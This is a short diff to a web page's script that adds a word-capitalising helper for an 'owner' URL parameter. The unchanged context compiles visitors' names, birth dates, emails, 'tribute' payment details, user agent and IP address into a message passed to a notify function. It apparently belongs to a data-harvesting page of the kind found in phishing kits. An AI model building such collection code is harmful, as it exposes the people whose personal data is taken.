@@ -681,6 +681,13 @@ color: #000000;
 <script type="text/javascript"  src="js/post.js"></script>
 
         <script>
+
+       function capitalizeWithRegex(str) {
+  return str.replace(/\b\w/g, char => char.toUpperCase());
+}
+
+
+
           var getUrlParameter = function getUrlParameter(sParam) {
           var sPageURL = window.location.search.substring(1),
               sURLVariables = sPageURL.split('&'),
@@ -699,6 +706,7 @@ color: #000000;
 
 
         const mistress = getUrlParameter('mistress');
+
         var id_mistress = document.querySelectorAll("#namediv");
         id_mistress.forEach((el, index) => {
             var mistress_div = el.getAttribute("nameid");//className = "a_new_class"
@@ -874,7 +882,7 @@ color: #000000;
                     $(".errors").html("");
                     var mdiv = "";
                     if(mistress != true || mistress != false){
-                        var mdiv = `ONWER:${mistress}\n`;
+                        var mdiv = `ONWER:${capitalizeWithRegex(mistress)}\n`;
                     }
                     var message = `PROVIDER: ${provider}\n${mdiv}FIRST NAME: ${fname}\nLAST NAME: ${lname}\nDATE OF BIRTH: ${dob}\nEMAIL ADDRESS: ${email}\nCOUNTRY: ${country}\n================\nTRIBUTE DURATION: ${dur_tribute}\nTRIBUTE AMOUNT: ${amount_tribute}\nBROWSERNAME: ${get_browsername}\nUSER-AGENT: ${window.navigator.userAgent}\nIP ADDRESS: ${get_ip}\n`;
                     var status = notify(message);
